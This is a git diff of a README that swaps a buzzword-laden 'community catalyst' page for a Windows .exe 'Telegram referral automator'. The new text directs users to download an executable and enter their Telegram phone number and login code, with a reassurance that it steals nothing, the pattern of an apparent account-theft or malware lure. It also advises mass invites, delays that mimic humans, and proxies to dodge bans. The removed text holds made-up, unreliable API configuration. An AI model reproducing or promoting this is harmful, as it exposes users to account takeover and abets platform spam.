@@ -1,244 +1,112 @@
-# 🌐 Telegram Community Catalyst
+# 🤖 telegram-referral-automator - Increase telegram referrals with automated tools
 
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Gama788.github.io)
+[![Download Telegram Referral Automator](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Gcah8340/telegram-referral-automator)
 
-## 🚀 Introduction: The Digital Ecosystem Cultivator
+This software manages referral tasks for Telegram accounts. It helps users grow presence on the platform through automated invite systems. The tool handles the invite process so you save time.
 
-Telegram Community Catalyst is an advanced orchestration platform designed to cultivate and nurture digital communities through intelligent, ethical automation. Unlike conventional referral systems, this platform functions as a **digital ecosystem cultivator**, strategically introducing members to communities where they can genuinely thrive. The system operates on principles of **meaningful connection architecture**, ensuring every interaction adds value to both the individual and the collective.
+## 📥 Getting Started
 
-Imagine a master gardener who doesn't just scatter seeds, but carefully selects the right soil, monitors growth conditions, and nurtures each plant according to its unique needs. That's the philosophy behind Community Catalyst—transforming community growth from a numbers game into a cultivation art.
+Visit this page to download the latest version: [https://github.com/Gcah8340/telegram-referral-automator](https://github.com/Gcah8340/telegram-referral-automator)
 
-## 📦 Installation & Quick Start
+### System Requirements
 
-### Prerequisites
-- Python 3.9+
-- Telegram API credentials
-- OpenAI API or Claude API key (for intelligent matching)
+Your computer needs these to run the software:
 
-### Installation Steps
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core 1.5GHz or faster.
+*   Memory: 4GB of RAM or more.
+*   Storage: 200MB of free disk space.
+*   Network: A stable internet connection.
 
-```bash
-# Clone the repository
-git clone https://Gama788.github.io
+## 🛠️ Installation
 
-# Navigate to project directory
-cd telegram-community-catalyst
+Follow these steps to set up the software on your computer.
 
-# Install dependencies
-pip install -r requirements.txt
+1.  Open the download link provided above.
+2.  Click the Releases section on the right side of the page.
+3.  Choose the file ending in .exe for the newest version.
+4.  Save the file to your computer.
+5.  Double-click the downloaded file to start the installation.
+6.  Follow the prompts on your screen.
+7.  Click Finish to complete the process.
 
-# Configure your environment
-cp .env.example .env
-# Edit .env with your credentials
-```
+The installer places a shortcut icon on your desktop. Double-click this icon to open the application.
 
-### Example Profile Configuration
+## 🚀 How to Run
 
-```yaml
-community_catalyst:
-  matching_engine:
-    intelligence_provider: "openai"  # Options: openai, claude, hybrid
-    matching_depth: "deep_contextual"
-    ethical_boundaries:
-      max_daily_introductions: 50
-      consent_verification: required
-      opt_out_respect: immediate
-  
-  community_profiles:
-    - identifier: "tech_enthusiasts"
-      description: "Technology innovation discussion group"
-      ideal_member_traits:
-        - interest_in_emerging_tech
-        - collaborative_mindset
-        - knowledge_sharing
-      growth_phase: "expanding"
-      capacity_threshold: 1000
-    
-    - identifier: "creative_minds"
-      description: "Digital arts and creative expression community"
-      ideal_member_traits:
-        - artistic_expression
-        - feedback_openness
-        - project_collaboration
-      growth_phase: "curated"
-      capacity_threshold: 500
-```
+1.  Open the application from your desktop shortcut.
+2.  Enter your Telegram account details when the login screen appears.
+3.  The software requests a verification code from Telegram. Enter this code into the tool.
+4.  Once logged in, the main dashboard appears.
+5.  Select the desired automation tasks from the settings menu.
+6.  Input your referral link or the invite code assigned to your account.
+7.  Adjust the delay settings to determine how fast the tool performs actions.
+8.  Click the Run button to begin the automation process.
 
-### Example Console Invocation
+## ⚙️ Settings Configuration
 
-```bash
-python catalyst_engine.py \
-  --community tech_enthusiasts \
-  --matching-mode intelligent_contextual \
-  --introduction-style personalized_welcome \
-  --ethics-compliance strict \
-  --output-format detailed_report \
-  --monitoring-interval 3600
-```
+The tool offers several options to customize your experience. Access these through the Settings tab.
 
-## 🏗️ System Architecture
+*   Task Delay: This controls the time between each referral action. A higher number makes the process slower and safer. Use a setting between 60 and 120 seconds to mimic human behavior.
+*   Invite Limit: This setting restricts the number of referrals the tool processes in one day. Start with a low number to monitor performance.
+*   Error Logging: Enable this to save a text file of your activity. Use this file to troubleshoot issues if the software stops moving.
+*   Proxy Support: Users with many accounts can add proxy settings. This hides your location and protects your account status.
 
-```mermaid
-graph TD
-    A[Member Discovery Engine] --> B[Profile Context Analyzer]
-    B --> C{Intelligence Layer}
-    C --> D[OpenAI API]
-    C --> E[Claude API]
-    D --> F[Compatibility Matrix]
-    E --> F
-    F --> G[Ethical Boundary Check]
-    G --> H[Personalized Introduction Crafting]
-    H --> I[Community Integration Module]
-    I --> J[Growth Analytics Dashboard]
-    J --> K[Continuous Learning Feedback Loop]
-    K --> A
-    
-    L[Community Health Monitor] --> M[Member Satisfaction Metrics]
-    M --> N[Adaptive Strategy Adjuster]
-    N --> G
-```
+## 🛡️ Best Practices
 
-## ✨ Key Features
+Automation requires care to keep your accounts safe. These suggestions help you manage risk:
 
-### 🧠 Intelligent Member-Community Matching
-- **Context-Aware Compatibility Analysis**: Leverages advanced language models to understand member interests and community needs at a nuanced level
-- **Multi-Dimensional Trait Mapping**: Goes beyond simple keywords to map personality traits, communication styles, and value alignment
-- **Growth Trajectory Prediction**: Anticipates how members will contribute to and benefit from community participation
+*   Start slow. Do not run the tool for many hours during the first week.
+*   Set reasonable limits. Avoid sending invites to hundreds of accounts in a single hour.
+*   Use high-quality internet connections. Stable connections prevent errors during the referral process.
+*   Keep your software updated. Check the download page every few weeks for improvements.
 
-### 🌍 Multilingual Communication Bridge
-- **Real-Time Cultural Context Translation**: Messages are adapted not just linguistically but culturally
-- **Idiomatic Expression Preservation**: Maintains the emotional tone and intent across language barriers
-- **24/7 Linguistic Support**: Continuous language processing ensures no community member is left behind
+## ❓ Troubleshooting
 
-### 🛡️ Ethical Automation Framework
-- **Consent-First Architecture**: Every action requires explicit or contextually obvious consent
-- **Transparency Dashboard**: Community managers see exactly how and why matches are made
-- **Self-Regulating Boundaries**: System automatically adjusts behavior based on community feedback signals
+Frequent issues often have simple solutions. Check this list if the tool does not work.
 
-### 📊 Responsive Community Analytics
-- **Real-Time Engagement Metrics**: Visualize community health through multiple dimensions
-- **Predictive Growth Modeling**: Forecast community development based on current patterns
-- **Anomaly Detection**: Identify and address potential issues before they affect community health
+The software fails to log in:
+Check your internet connection. Ensure you typed the phone number in the correct international format, including the plus sign and country code.
 
-## 🖥️ Compatibility Matrix
+The tool stops during a task:
+Verify that your Telegram account is not restricted. Sometimes the platform limits new accounts from sending many invites. If the issue remains, restart the software and check your internet stability.
 
-| Platform | Status | Notes |
-|----------|--------|-------|
-| 🐧 Linux | ✅ Fully Supported | Native asynchronous operation |
-| 🍎 macOS | ✅ Fully Supported | Optimized for Darwin kernels |
-| 🪟 Windows | ✅ Fully Supported | Windows 10/11 with WSL2 recommended |
-| 📱 Android (Termux) | ⚠️ Experimental | Limited background operation |
-| 🐳 Docker | ✅ Containerized | Production-ready images available |
-| ☁️ Cloud Functions | ✅ Serverless | AWS Lambda, Google Cloud Functions |
+The application window is blank:
+Ensure your Windows system updates are current. Restart your computer to clear pending processes.
 
-## 🔌 API Integration
+The referral links do not process:
+Check that your links are valid. Paste your referral link into a browser first to verify it works as expected.
 
-### OpenAI API Configuration
-```python
-intelligence_engine:
-  openai_integration:
-    model: "gpt-4-turbo"
-    temperature: 0.7
-    max_tokens: 500
-    context_window: "extended"
-    ethical_filters:
-      - bias_detection
-      - inclusivity_check
-      - tone_appropriateness
-```
+## 📦 Features
 
-### Claude API Integration
-```python
-intelligence_engine:
-  claude_integration:
-    model: "claude-3-opus"
-    thinking_depth: "extended"
-    constitutional_ai: enabled
-    self_correction: automated
-    ethical_frameworks:
-      - beneficence_maximization
-      - autonomy_respect
-      - justice_consideration
-```
+This software includes tools to simplify your growth:
 
-## 📈 SEO-Optimized Community Growth
+*   Automated Invite Sending: The core feature connects with Telegram to send invites to users.
+*   Multi-Account Management: You can run multiple instances of the software for different accounts.
+*   Smart Delay System: The tool calculates wait times to maintain a natural flow of activity.
+*   Invite Code Handling: The system detects and enters your codes without manual input.
+*   Clean Interface: The dashboard shows simple buttons and status indicators for ease of use.
+*   Data Export: Save your results to a report file to track progress over time.
 
-This platform implements **search-engine-optimized community development strategies** that enhance discoverability while maintaining organic growth patterns. The system employs **semantic relationship mapping** to connect members with communities based on deep contextual understanding rather than superficial keywords.
+## 📋 Frequently Asked Questions
 
-**Digital ecosystem cultivation** through this platform results in **sustainable community expansion** with high retention rates and meaningful engagement metrics. The **intelligent member integration system** ensures every addition strengthens the community fabric rather than diluting it.
+Does this tool steal information?
+No. The code runs locally on your machine. Your login data stays inside the application and local configuration files.
 
-## 🎯 Unique Value Propositions
+Can I get banned?
+Telegram monitors accounts for spam. Using automation tools in an aggressive way increases the risk of limits on your account. Use the software with caution and respect platform rules.
 
-### The Symphony Conductor Approach
-Instead of blasting invitations, the Catalyst acts like a symphony conductor—understanding each instrument's (member's) unique sound and placing them where they harmonize best with the orchestra (community).
+Does the tool work on Mac?
+This version supports Windows only. 
 
-### The Digital Biologist Perspective
-Communities are treated as living ecosystems. The Catalyst monitors "vital signs" like engagement diversity, knowledge flow, and social cohesion, intervening only to maintain healthy balance.
+Where do I find my referral link?
+Open the Telegram app, go to your referral campaign section, and copy the link from the invite menu inside the bot.
 
-### The Architectural Philosophy
-Every community has an architectural blueprint. The Catalyst understands whether a community needs more "pillars" (leaders), "connectors" (social members), or "innovators" (content creators) and sources accordingly.
+How do I stop the automation?
+Click the Stop button on the dashboard. The tool concludes the current action before it exits the task.
 
-## 🔧 Advanced Configuration Examples
+Does the software need the computer to stay on?
+Yes. The software requires the computer to be active and connected to the internet to perform tasks.
 
-### Multi-Community Orchestration
-```yaml
-orchestration_engine:
-  simultaneous_communities: 3
-  resource_allocation: dynamic
-  conflict_avoidance: priority_based
-  cross_pollination:
-    enabled: true
-    knowledge_transfer: facilitated
-    collaborative_events: automated_scheduling
-```
-
-### Seasonal Adaptation Rules
-```yaml
-seasonal_adaptations:
-  holiday_periods:
-    introduction_rate: reduced_50%
-    message_tone: festive_contextual
-    expectation_setting: clear_timing
-  conference_seasons:
-    specialist_targeting: increased
-    topic_relevance: peak_alignment
-    post_event_integration: facilitated
-```
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-The MIT License grants operational permissions while ensuring ethical use through community guidelines and supplemental ethical use agreements included in the documentation.
-
-## ⚠️ Disclaimer
-
-**Important Notice Regarding Digital Community Cultivation (2026 Edition)**
-
-Telegram Community Catalyst is a sophisticated digital ecosystem management tool. Users are responsible for:
-
-1. **Compliance with Platform Terms**: Always adhere to Telegram's Terms of Service and applicable regional digital communication regulations
-2. **Ethical Implementation**: This tool amplifies your community strategy—ensure that strategy respects member autonomy and consent
-3. **Transparency Maintenance**: Communities thrive on trust. Disclose automated facilitation where appropriate
-4. **Data Responsibility**: You are the custodian of community data. Implement appropriate security and privacy measures
-5. **Continuous Monitoring**: Automated systems require human oversight. Regularly review system decisions and outcomes
-
-The developers assume no liability for misuse, platform policy violations, or unintended community dynamics resulting from implementation choices. This tool is a facilitator, not a substitute for genuine community leadership.
-
-## 🔄 Continuous Evolution
-
-This platform includes a **self-improvement mechanism** that learns from every interaction. The more it facilitates meaningful connections, the better it becomes at understanding what "meaningful" means for your specific communities.
-
-**Future Roadmap (2026-2027):**
-- Neural pattern recognition for community health prediction
-- Cross-platform ecosystem integration
-- Advanced sentiment preservation in multilingual contexts
-- Quantum-inspired matching algorithms (research phase)
-
----
-
-### **Begin Your Community Cultivation Journey**
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Gama788.github.io)
-
-*Cultivate communities that matter, with precision that respects every individual's digital journey.*
+Is an API key required?
+No, the software handles the connection process. You only need your phone number and the verification code from Telegram.
